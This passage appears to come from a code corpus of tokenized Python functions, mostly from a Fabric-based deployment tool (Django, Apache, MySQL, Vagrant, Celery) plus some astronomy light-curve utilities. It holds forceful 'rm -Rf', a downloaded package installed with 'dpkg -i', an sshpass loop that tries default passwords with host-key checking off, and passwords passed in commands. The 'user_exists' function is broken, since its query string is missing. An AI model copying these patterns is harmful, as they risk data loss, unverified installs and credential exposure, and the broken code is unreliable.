. verbose : print ( 'Checking %i paths.' % len ( paths ) ) while paths : path = paths . pop ( 0 ) if self . verbose : print ( 'path:' , path ) app_name = re . findall ( r'/([^/]+)/sql/' , path ) [ 0 ] if apps and app_name not in apps : self . vprint ( 'skipping because app_name %s not in apps' % app_name ) continue with self . settings ( warn_only = True ) : if self . is_local : r . env . sql_path = path else : r . env . sql_path = '/tmp/%s' % os . path . split ( path ) [ - 1 ] r . put ( local_path = path , remote_path = r . env . sql_path ) ret = r . run_or_local ( cmd_template ) if ret and ret . return_code : if stop_on_error : raise Exception ( 'Unable to execute file %s' % path ) error_counts [ path ] += 1 if error_counts [ path ] < max_retries : paths . append ( path ) else : terminal . add ( path ) if terminal : print ( '%i files could not be loaded.' % len ( terminal ) , file = sys . stderr ) for path in sorted ( list ( terminal ) ) : print ( path , file = sys . stderr ) print ( file = sys . stderr ) if self . verbose : print ( 'install_sql.db_engine:' , r . env . db_engine ) for _site , site_data in self . iter_sites ( site = site , no_secure = True ) : self . set_db ( name = name , site = _site ) if 'postgres' in r . env . db_engine or 'postgis' in r . env . db_engine : paths = list ( get_paths ( 'postgresql' ) ) run_paths ( paths = paths , cmd_template = "psql --host={db_host} --user={db_user} --no-password -d {db_name} -f {sql_path}" ) elif 'mysql' in r . env . db_engine : paths = list ( get_paths ( 'mysql' ) ) run_paths ( paths = paths , cmd_template = "mysql -v -h {db_host} -u {db_user} -p'{db_password}' {db_name} < {sql_path}" ) else : raise NotImplementedError
def createsuperuser ( self , username = 'admin' , email = None , password = None , site = None ) : r = self . local_renderer site = site or self . genv . SITE self . set_site_specifics ( site ) options = [ '--username=%s' % username ] if email : options . append ( '--email=%s' % email ) if password : options . append ( '--password=%s' % password ) r . env . options_str = ' ' . join ( options ) if self . is_local : r . env . project_dir = r . env . local_project_dir r . genv . SITE = r . genv . SITE or site r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project_dir}; {manage_cmd} {createsuperuser_cmd} {options_str}' )
def manage ( self , cmd , * args , * * kwargs ) : r = self . local_renderer environs = kwargs . pop ( 'environs' , '' ) . strip ( ) if environs : environs = ' ' . join ( 'export %s=%s;' % tuple ( _ . split ( '=' ) ) for _ in environs . split ( ',' ) ) environs = ' ' + environs + ' ' r . env . cmd = cmd r . env . SITE = r . genv . SITE or r . genv . default_site r . env . args = ' ' . join ( map ( str , args ) ) r . env . kwargs = ' ' . join ( ( '--%s' % _k if _v in ( True , 'True' ) else '--%s=%s' % ( _k , _v ) ) for _k , _v in kwargs . items ( ) ) r . env . environs = environs if self . is_local : r . env . project_dir = r . env . local_project_dir r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE};{environs} cd {project_dir}; {manage_cmd} {cmd} {args} {kwargs}' )
def load_django_settings ( self ) : r = self . local_renderer # Save environment variables so we can restore them later. _env = { } save_vars = [ 'ALLOW_CELERY' , 'DJANGO_SETTINGS_MODULE' ] for var_name in save_vars : _env [ var_name ] = os . environ . get ( var_name ) try : # Allow us to import local app modules. if r . env . local_project_dir : sys . path . insert ( 0 , r . env . local_project_dir ) #TODO:remove this once bug in django-celery has been fixed os . environ [ 'ALLOW_CELERY' ] = '0' #             print('settings_module:', r.format(r.env.settings_module)) os . environ [ 'DJANGO_SETTINGS_MODULE' ] = r . format ( r . env . settings_module ) #             os.environ['CELERY_LOADER'] = 'django' #             os.environ['SITE'] = r.genv.SITE or r.genv.default_site #             os.environ['ROLE'] = r.genv.ROLE or r.genv.default_role # In Django >= 1.7, fixes the error AppRegistryNotReady: Apps aren't loaded yet # Disabling, in Django >= 1.10, throws exception: # RuntimeError: Model class django.contrib.contenttypes.models.ContentType # doesn't declare an explicit app_label and isn't in an application in INSTALLED_APPS. #             try: #                 from django.core.wsgi import get_wsgi_application #                 application = get_wsgi_application() #             except (ImportError, RuntimeError): #                 raise #                 print('Unable to get wsgi application.') #                 traceback.print_exc() # In Django >= 1.7, fixes the error AppRegistryNotReady: Apps aren't loaded yet try : import django django . setup ( ) except AttributeError : # This doesn't exist in Django < 1.7, so ignore it. pass # Load Django settings. settings = self . get_settings ( ) try : from django . contrib import staticfiles from django . conf import settings as _settings # get_settings() doesn't raise ImportError but returns None instead if settings is not None : for k , v in settings . __dict__ . items ( ) : setattr ( _settings , k , v ) else : raise ImportError except ( ImportError , RuntimeError ) : print ( 'Unable to load settings.' ) traceback . print_exc ( ) finally : # Restore environment variables. for var_name , var_value in _env . items ( ) : if var_value is None : del os . environ [ var_name ] else : os . environ [ var_name ] = var_value return settings
def syncdb ( self , site = None , all = 0 , database = None , ignore_errors = 1 ) : # pylint: disable=redefined-builtin r = self . local_renderer ignore_errors = int ( ignore_errors ) post_south = self . version_tuple >= ( 1 , 7 , 0 ) use_run_syncdb = self . version_tuple >= ( 1 , 9 , 0 ) # DEPRECATED: removed in Django>=1.7 r . env . db_syncdb_all_flag = '--all' if int ( all ) else '' r . env . db_syncdb_database = '' if database : r . env . db_syncdb_database = ' --database=%s' % database if self . is_local : r . env . project_dir = r . env . local_project_dir site = site or self . genv . SITE for _site , site_data in r . iter_unique_databases ( site = site ) : r . env . SITE = _site with self . settings ( warn_only = ignore_errors ) : if post_south : if use_run_syncdb : r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project_dir}; ' '{manage_cmd} migrate --run-syncdb --noinput {db_syncdb_database}' ) else : # Between Django>=1.7,<1.9 we can only do a regular migrate, no true syncdb. r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project_dir}; ' '{manage_cmd} migrate --noinput {db_syncdb_database}' ) else : r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE}; cd {project_dir}; ' '{manage_cmd} syncdb --noinput {db_syncdb_all_flag} {db_syncdb_database}' )
def migrate ( self , app = '' , migration = '' , site = None , fake = 0 , ignore_errors = None , skip_databases = None , database = None , migrate_apps = '' , delete_ghosts = 1 ) : #     Note, to pass a comma-delimted list in a fab command, escape the comma with a back slash. # #         e.g. # #             fab staging dj.migrate:migrate_apps=oneapp\,twoapp\,threeapp r = self . local_renderer ignore_errors = int ( r . env . ignore_migration_errors if ignore_errors is None else ignore_errors ) delete_ghosts = int ( delete_ghosts ) post_south = self . version_tuple >= ( 1 , 7 , 0 ) if self . version_tuple >= ( 1 , 9 , 0 ) : delete_ghosts = 0 skip_databases = ( skip_databases or '' ) if isinstance ( skip_databases , six . string_types ) : skip_databases = [ _ . strip ( ) for _ in skip_databases . split ( ',' ) if _ . strip ( ) ] migrate_apps = migrate_apps or '' migrate_apps = [ _ . strip ( ) . split ( '.' ) [ - 1 ] for _ in migrate_apps . strip ( ) . split ( ',' ) if _ . strip ( ) ] if app : migrate_apps . append ( app ) r . env . migrate_migration = migration or '' r . env . migrate_fake_str = '--fake' if int ( fake ) else '' r . env . migrate_database = '--database=%s' % database if database else '' r . env . migrate_merge = '--merge' if not post_south else '' r . env . delete_ghosts = '--delete-ghost-migrations' if delete_ghosts and not post_south else '' self . vprint ( 'project_dir0:' , r . env . project_dir , r . genv . get ( 'dj_project_dir' ) , r . genv . get ( 'project_dir' ) ) self . vprint ( 'migrate_apps:' , migrate_apps ) if self . is_local : r . env . project_dir = r . env . local_project_dir # CS 2017-3-29 Don't bypass the iterator. That causes reversion to the global env that could corrupt the generated commands. #databases = list(self.iter_unique_databases(site=site))#TODO:remove # CS 2017-4-24 Don't specify a single site as the default when none is supplied. Otherwise all other sites will be ignored. #site = site or self.genv.SITE site = site or ALL databases = self . iter_unique_databases ( site = site ) for _site , site_data in databases : self . vprint ( '-' * 80 , file = sys . stderr ) self . vprint ( 'site:' , _site , file = sys . stderr ) if self . env . available_sites_by_host : hostname = self . current_hostname sites_on_host = self . env . available_sites_by_host . get ( hostname , [ ] ) if sites_on_host and _site not in sites_on_host : self . vprint ( 'skipping site:' , _site , sites_on_host , file = sys . stderr ) continue if not migrate_apps : migrate_apps . append ( ' ' ) for _app in migrate_apps : # In cases where we're migrating built-in apps or apps with dotted names # e.g. django.contrib.auth, extract the name used for the migrate command. r . env . migrate_app = _app . split ( '.' ) [ - 1 ] self . vprint ( 'project_dir1:' , r . env . project_dir , r . genv . get ( 'dj_project_dir' ) , r . genv . get ( 'project_dir' ) ) r . env . SITE = _site with self . settings ( warn_only = ignore_errors ) : r . run_or_local ( 'export SITE={SITE}; export ROLE={ROLE}; {migrate_pre_command} cd {project_dir}; ' '{manage_cmd} migrate --noinput {migrate_merge} --traceback ' '{migrate_database} {delete_ghosts} {migrate_app} {migrate_migration} ' '{migrate_fake_str}' )
def database_renderer ( self , name = None , site = None , role = None ) : name = name or self . env . default_db_name site = site or self . genv . SITE role = role or self . genv . ROLE key = ( name , site , role ) self . vprint ( 'checking key:' , key ) if key not in self . _database_renderers : self . vprint ( 'No cached db renderer, generating...' ) if self . verbose : print ( 'db.name:' , name ) print ( 'db.databases:' , self . env . databases ) print ( 'db.databases[%s]:' % name , self . env . databases . get ( name ) ) d = type ( self . genv ) ( self . lenv ) d . update ( self . get_database_defaults ( ) ) d . update ( self . env . databases . get ( name , { } ) ) d [ 'db_name' ] = name if self . verbose : print ( 'db.d:' ) pprint ( d , indent = 4 ) print ( 'db.connection_handler:' , d . connection_handler ) if d . connection_handler == CONNECTION_HANDLER_DJANGO : self . vprint ( 'Using django handler...' ) dj = self . get_satchel ( 'dj' ) if self . verbose : print ( 'Loading Django DB settings for site {} and role {}.' . format ( site , role ) , file = sys . stderr ) dj . set_db ( name = name , site = site , role = role ) _d = dj . local_renderer . collect_genv ( include_local = True , include_global = False ) # Copy "dj_db_*" into "db_*". for k , v in _d . items ( ) : if k . startswith ( 'dj_db_' ) : _d [ k [ 3 : ] ] = v del _d [ k ] if self . verbose : print ( 'Loaded:' ) pprint ( _d ) d . update ( _d ) elif d . connection_handler and d . connection_handler . startswith ( CONNECTION_HANDLER_CUSTOM + ':' ) : _callable_str = d . connection_handler [ len ( CONNECTION_HANDLER_CUSTOM + ':' ) : ] self . vprint ( 'Using custom handler %s...' % _callable_str ) _d = str_to_callable ( _callable_str ) ( role = self . genv . ROLE ) if self . verbose : print ( 'Loaded:' ) pprint ( _d ) d . update ( _d ) r = LocalRenderer ( self , lenv = d ) # Optionally set any root logins needed for administrative commands. self . set_root_login ( r ) self . _database_renderers [ key ] = r else : self . vprint ( 'Cached db renderer found.' ) return self . _database_renderers [ key ]
def get_free_space ( self ) : cmd = "df -k | grep -vE '^Filesystem|tmpfs|cdrom|none|udev|cgroup' | awk '{ print($1 \" \" $4 }'" lines = [ _ for _ in self . run ( cmd ) . strip ( ) . split ( '\n' ) if _ . startswith ( '/' ) ] assert len ( lines ) == 1 , 'Ambiguous devices: %s' % str ( lines ) device , kb = lines [ 0 ] . split ( ' ' ) free_space = int ( kb ) * 1024 self . vprint ( 'free_space (bytes):' , free_space ) return free_space
def load_db_set ( self , name , r = None ) : r = r or self db_set = r . genv . db_sets . get ( name , { } ) r . genv . update ( db_set )
def loadable ( self , src , dst ) : from fabric import state from fabric . task_utils import crawl src_task = crawl ( src , state . commands ) assert src_task , 'Unknown source role: %s' % src dst_task = crawl ( dst , state . commands ) assert dst_task , 'Unknown destination role: %s' % src # Get source database size. src_task ( ) env . host_string = env . hosts [ 0 ] src_size_bytes = self . get_size ( ) # Get target database size, if any. dst_task ( ) env . host_string = env . hosts [ 0 ] try : dst_size_bytes = self . get_size ( ) except ( ValueError , TypeError ) : dst_size_bytes = 0 # Get target host disk size. free_space_bytes = self . get_free_space ( ) # Deduct existing database size, because we'll be deleting it. balance_bytes = free_space_bytes + dst_size_bytes - src_size_bytes balance_bytes_scaled , units = pretty_bytes ( balance_bytes ) viable = balance_bytes >= 0 if self . verbose : print ( 'src_db_size:' , pretty_bytes ( src_size_bytes ) ) print ( 'dst_db_size:' , pretty_bytes ( dst_size_bytes ) ) print ( 'dst_free_space:' , pretty_bytes ( free_space_bytes ) ) print if viable : print ( 'Viable! There will be %.02f %s of disk space left.' % ( balance_bytes_scaled , units ) ) else : print ( 'Not viable! We would be %.02f %s short.' % ( balance_bytes_scaled , units ) ) return viable
def assume_localhost ( self ) : if not self . genv . host_string : self . genv . host_string = 'localhost' self . genv . hosts = [ 'localhost' ] self . genv . user = getpass . getuser ( )
def fix_lsmod_for_pi3 ( self ) : r = self . local_renderer r . env . rpi2_conf = '/etc/modules-load.d/rpi2.conf' r . sudo ( "sed '/bcm2808_rng/d' {rpi2_conf}" ) r . sudo ( "echo bcm2835_rng >> {rpi2_conf}" )
def pre_deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) funcs = common . service_pre_deployers . get ( service ) if funcs : print ( 'Running pre-deployments for service %s...' % ( service , ) ) for func in funcs : func ( )
def deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) funcs = common . service_deployers . get ( service ) if funcs : print ( 'Deploying service %s...' % ( service , ) ) for func in funcs : if not self . dryrun : func ( )
def post_deploy ( self ) : for service in self . genv . services : service = service . strip ( ) . upper ( ) self . vprint ( 'post_deploy:' , service ) funcs = common . service_post_deployers . get ( service ) if funcs : self . vprint ( 'Running post-deployments for service %s...' % ( service , ) ) for func in funcs : try : func ( ) except Exception as e : print ( 'Post deployment error: %s' % e , file = sys . stderr ) print ( traceback . format_exc ( ) , file = sys . stderr )
def configure ( self ) : print ( 'env.services:' , self . genv . services ) for service in list ( self . genv . services ) : service = service . strip ( ) . upper ( ) funcs = common . service_configurators . get ( service , [ ] ) if funcs : print ( '!' * 80 ) print ( 'Configuring service %s...' % ( service , ) ) for func in funcs : print ( 'Function:' , func ) if not self . dryrun : func ( )
def sync_media ( self , sync_set = None , clean = 0 , iter_local_paths = 0 ) : # Ensure a site is selected. self . genv . SITE = self . genv . SITE or self . genv . default_site r = self . local_renderer clean = int ( clean ) self . vprint ( 'Getting site data for %s...' % self . genv . SITE ) self . set_site_specifics ( self . genv . SITE ) sync_sets = r . env . sync_sets if sync_set : sync_sets = [ sync_set ] ret_paths = [ ] for _sync_set in sync_sets : for paths in r . env . sync_sets [ _sync_set ] : r . env . sync_local_path = os . path . abspath ( paths [ 'local_path' ] % self . genv ) if paths [ 'local_path' ] . endswith ( '/' ) and not r . env . sync_local_path . endswith ( '/' ) : r . env . sync_local_path += '/' if iter_local_paths : ret_paths . append ( r . env . sync_local_path ) continue r . env . sync_remote_path = paths [ 'remote_path' ] % self . genv if clean : r . sudo ( 'rm -Rf {apache_sync_remote_path}' ) print ( 'Syncing %s to %s...' % ( r . env . sync_local_path , r . env . sync_remote_path ) ) r . env . tmp_chmod = paths . get ( 'chmod' , r . env . chmod ) r . sudo ( 'mkdir -p {apache_sync_remote_path}' ) r . sudo ( 'chmod -R {apache_tmp_chmod} {apache_sync_remote_path}' ) r . local ( 'rsync -rvz --progress --recursive --no-p --no-g ' '--rsh "ssh -o StrictHostKeyChecking=no -i {key_filename}" {apache_sync_local_path} {user}@{host_string}:{apache_sync_remote_path}' ) r . sudo ( 'chown -R {apache_web_user}:{apache_web_group} {apache_sync_remote_path}' ) if iter_local_paths : return ret_paths
def configure_site ( self , full = 1 , site = None , delete_old = 0 ) : from burlap import service r = self . local_renderer print ( 'Configuring Apache...' , file = sys . stderr ) site = site or self . genv . SITE if int ( delete_old ) and site == ALL : # Delete all existing enabled and available sites. r . sudo ( 'rm -f {sites_available}/*' ) r . sudo ( 'rm -f {sites_enabled}/*' ) if r . env . manage_site_conf : # Run an optional customizable command to clear or delete old sites before writing the new ones. if r . env . delete_site_command : r . sudo ( r . env . delete_site_command ) for _site , site_data in self . iter_sites ( site = site , setter = self . set_site_specifics ) : r = self . local_renderer #r.env.site = site if self . verbose : print ( '-' * 80 , file = sys . stderr ) print ( 'Site:' , _site , file = sys . stderr ) print ( '-' * 80 , file = sys . stderr ) r . env . ssl = _site . endswith ( '_secure' ) r . env . apache_site = _site r . env . server_name = r . format ( r . env . domain_template ) # Write WSGI template if r . env . wsgi_enabled : r . pc ( 'Writing WSGI template for site %s...' % _site ) r . env . wsgi_scriptalias = r . format ( r . env . wsgi_scriptalias ) fn = self . render_to_file ( r . env . wsgi_template ) r . env . wsgi_dir = r . env . remote_dir = os . path . split ( r . env . wsgi_scriptalias ) [ 0 ] r . sudo ( 'mkdir -p {remote_dir}' ) r . put ( local_path = fn , remote_path = r . env . wsgi_scriptalias , use_sudo = True ) # Write site configuration. r . pc ( 'Writing site configuration for site %s...' % _site ) r . env . auth_basic_authuserfile = r . format ( self . env . auth_basic_authuserfile ) r . env . ssl_certificates = list ( self . iter_certificates ( ) ) if r . env . server_aliases_template : r . env . server_aliases = r . format ( r . env . server_aliases_template ) if r . env . domain_with_sub_template : r . env . domain_with_sub = r . format ( r . env . domain_with_sub_template ) if r . env . domain_without_sub_template : r . env . domain_without_sub = r . format ( r . env . domain_without_sub_template ) if r . env . domain_template : r . env . domain = r . format ( r . env . domain_template ) genv = r . collect_genv ( ) genv [ 'current_hostname' ] = self . current_hostname fn = self . render_to_file ( self . env . site_template , extra = genv , formatter = partial ( r . format , ignored_variables = self . env . ignored_template_variables ) ) r . env . site_conf = _site + '.conf' r . env . site_conf_fqfn = os . path . join ( r . env . sites_available , r . env . site_conf ) r . put ( local_path = fn , remote_path = r . env . site_conf_fqfn , use_sudo = True ) self . enable_site ( _site ) self . clear_local_renderer ( ) self . enable_mods ( ) if int ( full ) : # Write master Apache configuration file. if r . env . manage_httpd_conf : fn = self . render_to_file ( 'apache/apache_httpd.template.conf' ) r . put ( local_path = fn , remote_path = r . env . conf , use_sudo = True ) # Write Apache listening ports configuration. if r . env . manage_ports_conf : fn = self . render_to_file ( 'apache/apache_ports.template.conf' ) r . put ( local_path = fn , remote_path = r . env . ports_path , use_sudo = True ) r . sudo ( 'chown -R {apache_web_user}:{apache_web_group} {apache_root}' )
def maint_up ( self ) : r = self . local_renderer fn = self . render_to_file ( r . env . maintenance_template , extra = { 'current_hostname' : self . current_hostname } ) r . put ( local_path = fn , remote_path = r . env . maintenance_path , use_sudo = True ) r . sudo ( 'chown -R {apache_web_user}:{apache_web_group} {maintenance_path}' )
def get_current_commit ( self ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : s = str ( self . local ( 'git rev-parse HEAD' , capture = True ) ) self . vprint ( 'current commit:' , s ) return s
def ssh_config ( self , name = '' ) : r = self . local_renderer with self . settings ( hide ( 'running' ) ) : output = r . local ( 'vagrant ssh-config %s' % name , capture = True ) config = { } for line in output . splitlines ( ) [ 1 : ] : key , value = line . strip ( ) . split ( ' ' , 2 ) config [ key ] = value return config
def version ( self ) : r = self . local_renderer with self . settings ( hide ( 'running' , 'warnings' ) , warn_only = True ) : res = r . local ( 'vagrant --version' , capture = True ) if res . failed : return None line = res . splitlines ( ) [ - 1 ] version = re . match ( r'Vagrant (?:v(?:ersion )?)?(.*)' , line ) . group ( 1 ) return tuple ( _to_int ( part ) for part in version . split ( '.' ) )
def base_boxes ( self ) : return sorted ( list ( set ( [ name for name , provider in self . _box_list ( ) ] ) ) )
def install_from_upstream ( self ) : from burlap . system import get_arch , distrib_family r = self . local_renderer content = urlopen ( r . env . download_url ) . read ( ) print ( len ( content ) ) matches = DOWNLOAD_LINK_PATTERN . findall ( content ) print ( matches ) arch = get_arch ( ) # e.g. 'x86_64' family = distrib_family ( ) if family == DEBIAN : ext = '.deb' matches = [ match for match in matches if match . endswith ( ext ) and arch in match ] print ( 'matches:' , matches ) assert matches , "No matches found." assert len ( matches ) == 1 , "Too many matches found: %s" % ( ', ' . join ( matches ) ) r . env . final_download_url = matches [ 0 ] r . env . local_filename = '/tmp/vagrant%s' % ext r . run ( 'wget -O {local_filename} {final_download_url}' ) r . sudo ( 'dpkg -i {local_filename}' ) else : raise NotImplementedError ( 'Unsupported family: %s' % family )
def force_stop ( self ) : r = self . local_renderer with self . settings ( warn_only = True ) : r . sudo ( 'pkill -9 -f celery' ) r . sudo ( 'rm -f /tmp/celery*.pid' )
def set_permissions ( self ) : r = self . local_renderer for path in r . env . paths_owned : r . env . path_owned = path r . sudo ( 'chown {celery_daemon_user}:{celery_daemon_user} {celery_path_owned}' )
def create_supervisor_services ( self , site ) : self . vprint ( 'create_supervisor_services:' , site ) self . set_site_specifics ( site = site ) r = self . local_renderer if self . verbose : print ( 'r.env:' ) pprint ( r . env , indent = 4 ) self . vprint ( 'r.env.has_worker:' , r . env . has_worker ) if not r . env . has_worker : self . vprint ( 'skipping: no celery worker' ) return if self . name . lower ( ) not in self . genv . services : self . vprint ( 'skipping: celery not enabled' ) return hostname = self . current_hostname target_sites = self . genv . available_sites_by_host . get ( hostname , None ) if target_sites and site not in target_sites : self . vprint ( 'skipping: site not supported on this server' ) return self . render_paths ( ) conf_name = 'celery_%s.conf' % site ret = r . render_to_string ( 'celery/celery_supervisor.template.conf' ) return conf_name , ret
def purge_keys ( self ) : r = self . local_renderer r . env . default_ip = self . hostname_to_ip ( self . env . default_hostname ) r . env . home_dir = '/home/%s' % getpass . getuser ( ) r . local ( 'ssh-keygen -f "{home_dir}/.ssh/known_hosts" -R {host_string}' ) if self . env . default_hostname : r . local ( 'ssh-keygen -f "{home_dir}/.ssh/known_hosts" -R {default_hostname}' ) if r . env . default_ip : r . local ( 'ssh-keygen -f "{home_dir}/.ssh/known_hosts" -R {default_ip}' )
def find_working_password ( self , usernames = None , host_strings = None ) : r = self . local_renderer if host_strings is None : host_strings = [ ] if not host_strings : host_strings . append ( self . genv . host_string ) if usernames is None : usernames = [ ] if not usernames : usernames . append ( self . genv . user ) for host_string in host_strings : for username in usernames : passwords = [ ] passwords . append ( self . genv . user_default_passwords [ username ] ) passwords . append ( self . genv . user_passwords [ username ] ) passwords . append ( self . env . default_password ) for password in passwords : with settings ( warn_only = True ) : r . env . host_string = host_string r . env . password = password r . env . user = username ret = r . _local ( "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {user}@{host_string} echo hello" , capture = True ) #print('ret.return_code:', ret.return_code) #             print('ret000:[%s]' % ret) #code 1 = good password, but prompts needed #code 5 = bad password #code 6 = good password, but host public key is unknown if ret . return_code in ( 1 , 6 ) or 'hello' in ret : # Login succeeded, so we haven't yet changed the password, so use the default password. return host_string , username , password raise Exception ( 'No working login found.' )
def get_public_ip ( self ) : r = self . local_renderer ret = r . run ( r . env . get_public_ip_command ) or '' ret = ret . strip ( ) print ( 'ip:' , ret ) return ret
def query ( query , use_sudo = True , * * kwargs ) : func = use_sudo and run_as_root or run user = kwargs . get ( 'mysql_user' ) or env . get ( 'mysql_user' ) password = kwargs . get ( 'mysql_password' ) or env . get ( 'mysql_password' ) options = [ '--batch' , '--raw' , '--skip-column-names' , ] if user : options . append ( '--user=%s' % quote ( user ) ) if password : options . append ( '--password=%s' % quote ( password ) ) options = ' ' . join ( options ) return func ( 'mysql %(options)s --execute=%(query)s' % { 'options' : options , 'query' : quote ( query ) , } )
def user_exists ( name , host = 'localhost' , * * kwargs ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : res = query ( % { 'name' : name , 'host' : host , } , * * kwargs ) return res . succeeded and ( int ( res ) == 1 )
def database_exists ( name , * * kwargs ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn_only = True ) : res = query ( "SHOW DATABASES LIKE '%(name)s';" % { 'name' : name } , * * kwargs ) return res . succeeded and ( res == name )
def conf_path ( self ) : from burlap . system import distrib_id , distrib_release hostname = self . current_hostname if hostname not in self . _conf_cache : self . env . conf_specifics [ hostname ] = self . env . conf_default d_id = distrib_id ( ) d_release = distrib_release ( ) for key in ( ( d_id , d_release ) , ( d_id , ) ) : if key in self . env . conf_specifics : self . _conf_cache [ hostname ] = self . env . conf_specifics [ key ] return self . _conf_cache [ hostname ]
def drop_views ( self , name = None , site = None ) : r = self . database_renderer result = r . sudo ( "mysql --batch -v -h {db_host} " #"-u {db_root_username} -p'{db_root_password}' " "-u {db_user} -p'{db_password}' " "--execute=\"SELECT GROUP_CONCAT(CONCAT(TABLE_SCHEMA,'.',table_name) SEPARATOR ', ') AS views " "FROM INFORMATION_SCHEMA.views WHERE TABLE_SCHEMA = '{db_name}' ORDER BY table_name DESC;\"" ) result = re . findall ( r'^views[\s\t\r\n]+(.*)' , result , flags = re . IGNORECASE | re . DOTALL | re . MULTILINE ) if not result : return r . env . db_view_list = result [ 0 ] #cmd = ("mysql -v -h {db_host} -u {db_root_username} -p'{db_root_password}' " \ r . sudo ( "mysql -v -h {db_host} -u {db_user} -p'{db_password}' " "--execute=\"DROP VIEW {db_view_list} CASCADE;\"" )
def exists ( self , * * kwargs ) : name = kwargs . pop ( 'name' , 'default' ) site = kwargs . pop ( 'site' , None ) r = self . database_renderer ( name = name , site = site ) ret = r . run ( 'mysql -h {db_host} -u {db_root_username} ' '-p"{db_root_password}" -N -B -e "SELECT IF(\'{db_name}\'' ' IN(SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA), ' '\'exists\', \'notexists\') AS found;"' ) if ret is not None : ret = 'notexists' not in ( ret or 'notexists' ) if ret is not None : msg = '%s database on site %s %s exist.' % ( name . title ( ) , env . SITE , 'DOES' if ret else 'DOES NOT' ) if ret : print ( green ( msg ) ) else : print ( red ( msg ) ) return ret
def _pycompress_sqlitecurve ( sqlitecurve , force = False ) : outfile = '%s.gz' % sqlitecurve try : if os . path . exists ( outfile ) and not force : os . remove ( sqlitecurve ) return outfile else : with open ( sqlitecurve , 'rb' ) as infd : with gzip . open ( outfile , 'wb' ) as outfd : shutil . copyfileobj ( infd , outfd ) if os . path . exists ( outfile ) : os . remove ( sqlitecurve ) return outfile except Exception as e : return None
def _pyuncompress_sqlitecurve ( sqlitecurve , force = False ) : outfile = sqlitecurve . replace ( '.gz' , '' ) try : if os . path . exists ( outfile ) and not force : return outfile else : with gzip . open ( sqlitecurve , 'rb' ) as infd : with open ( outfile , 'wb' ) as outfd : shutil . copyfileobj ( infd , outfd ) # do not remove the intput file yet if os . path . exists ( outfile ) : return outfile except Exception as e : return None
def _parse_csv_header_lcc_csv_v1 ( headerlines ) : # the first three lines indicate the format name, comment char, separator commentchar = headerlines [ 1 ] separator = headerlines [ 2 ] headerlines = [ x . lstrip ( '%s ' % commentchar ) for x in headerlines [ 3 : ] ] # next, find the indices of the various LC sections metadatastart = headerlines . index ( 'OBJECT METADATA' ) columnstart = headerlines . index ( 'COLUMN DEFINITIONS' ) lcstart = headerlines . index ( 'LIGHTCURVE' ) metadata = ' ' . join ( headerlines [ metadatastart + 1 : columnstart - 1 ] ) columns = ' ' . join ( headerlines [ columnstart + 1 : lcstart - 1 ] ) metadata = json . loads ( metadata ) columns = json . loads ( columns ) return metadata , columns , separator
def _starfeatures_worker ( task ) : try : ( lcfile , outdir , kdtree , objlist , lcflist , neighbor_radius_arcsec , deredden , custom_bandpasses , lcformat , lcformatdir ) = task return get_starfeatures ( lcfile , outdir , kdtree , objlist , lcflist , neighbor_radius_arcsec , deredden = deredden , custom_bandpasses = custom_bandpasses , lcformat = lcformat , lcformatdir = lcformatdir ) except Exception as e : return None
def pwd_phasebin ( phases , mags , binsize = 0.002 , minbin = 9 ) : bins = np . arange ( 0.0 , 1.0 , binsize ) binnedphaseinds = npdigitize ( phases , bins ) binnedphases , binnedmags = [ ] , [ ] for x in npunique ( binnedphaseinds ) : thisbin_inds = binnedphaseinds == x thisbin_phases = phases [ thisbin_inds ] thisbin_mags = mags [ thisbin_inds ] if thisbin_inds . size > minbin : binnedphases . append ( npmedian ( thisbin_phases ) ) binnedmags . append ( npmedian ( thisbin_mags ) ) return np . array ( binnedphases ) , np . array ( binnedmags )
def _periodicfeatures_worker ( task ) : pfpickle , lcbasedir , outdir , starfeatures , kwargs = task try : return get_periodicfeatures ( pfpickle , lcbasedir , outdir , starfeatures = starfeatures , * * kwargs ) except Exception as e : LOGEXCEPTION ( 'failed to get periodicfeatures for %s' % pfpickle )
def commit ( self ) : if not self . connection . closed : self . connection . commit ( ) else : raise AttributeError ( 'postgres connection to %s is closed' % self . database )
def rollback ( self ) : if not self . connection . closed : self . connection . rollback ( ) else : raise AttributeError ( 'postgres connection to %s is closed' % self . database )
def _log_prior_transit ( theta , priorbounds ) : # priorbounds contains the input priors, and because of how we previously # sorted theta, its sorted keys tell us which parts of theta correspond to # which physical quantities. allowed = True for ix , key in enumerate ( np . sort ( list ( priorbounds . keys ( ) ) ) ) : if priorbounds [ key ] [ 0 ] < theta [ ix ] < priorbounds [ key ] [ 1 ] : allowed = True and allowed else : allowed = False if allowed : return 0. return - np . inf
def list_trilegal_filtersystems ( ) : print ( '%-40s %s' % ( 'FILTER SYSTEM NAME' , 'DESCRIPTION' ) ) print ( '%-40s %s' % ( '------------------' , '-----------' ) ) for key in sorted ( TRILEGAL_FILTER_SYSTEMS . keys ( ) ) : print ( '%-40s %s' % ( key , TRILEGAL_FILTER_SYSTEMS [ key ] [ 'desc' ] ) )
def initialize ( self , currentdir , assetpath , cplist , cplistfile , executor , readonly , baseurl ) : self . currentdir = currentdir self . assetpath = assetpath self . currentproject = cplist self . cplistfile = cplistfile self . executor = executor self . readonly = readonly self . baseurl = baseurl
def initialize ( self , executor , secret ) : self . executor = executor self . secret = secret
